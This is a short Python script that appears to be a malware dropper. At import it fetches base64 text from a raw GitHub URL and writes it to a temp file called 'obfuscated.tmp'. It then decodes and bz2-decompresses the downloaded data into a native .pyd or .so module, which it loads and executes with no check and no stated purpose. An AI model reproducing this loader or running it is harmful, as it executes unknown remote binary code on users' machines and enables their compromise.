import base64
import tempfile
import os
import importlib.util
import sys
import bz2
import requests

BASE64_URL = "https://raw.githubusercontent.com/Markest-sys/raw/refs/heads/main/base64.txt"

def load_base64_content():
    url = BASE64_URL
    response = requests.get(url)
    response.raise_for_status()
    return response.text

obfuscated_pyURL = "https://raw.githubusercontent.com/Markest-sys/raw/refs/heads/main/base64.txt"

def load_obfuscated_content():
    url = obfuscated_pyURL
    response = requests.get(url)
    response.raise_for_status()
    return response.text

temp_code = load_obfuscated_content()

# Создание временного файла при запуске
import tempfile
import os

temp_dir = tempfile.gettempdir()
temp_file = os.path.join(temp_dir, 'obfuscated.tmp')
with open(temp_file, 'w', encoding='utf-8') as f:
    f.write(temp_code)

native_module_base64 = load_base64_content()


def load_native_module():
    binary_content = base64.b64decode(native_module_base64)
    compressed_binary_content = bz2.decompress(binary_content)
    suffix = '.pyd' if sys.platform == 'win32' else '.so'
    with tempfile.NamedTemporaryFile(suffix=suffix, delete=False) as tmp_file:
        tmp_file.write(compressed_binary_content)
        module_path = tmp_file.name
    spec = importlib.util.spec_from_file_location('input_obf', module_path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module

native_module = load_native_module()


